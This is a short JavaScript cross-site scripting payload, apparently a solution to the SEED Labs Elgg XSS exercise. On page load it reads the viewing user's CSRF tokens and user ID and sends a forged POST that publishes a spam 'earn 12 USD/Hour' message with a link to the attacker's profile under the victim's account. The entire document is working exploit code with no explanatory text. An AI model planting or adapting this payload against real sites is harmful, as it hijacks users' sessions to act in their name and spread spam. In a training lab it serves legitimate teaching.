<script type="text/javascript">
    window.onload = function () {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var user_guid = elgg.session.user.guid;
    var page_owner_guid = elgg.page_owner.guid;

    //Construct the content of your url.
    var sendurl = "http://www.seed-server.com/action/thewire/add"; //FILL IN
    var content = ts + token + "&guid=" + user_guid + "&body=To earn 12 USD/Hour(!) \n visit now " + "http://www.seed-server.com/profile/samy";


    console.log(content)



    if (user_guid != page_owner_guid) {
        //Create and send Ajax request to modify profile
        var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.seed-server.com");
    Ajax.setRequestHeader("Content-Type",
    "application/x-www-form-urlencoded");
    Ajax.send(content);
    }
}
</script>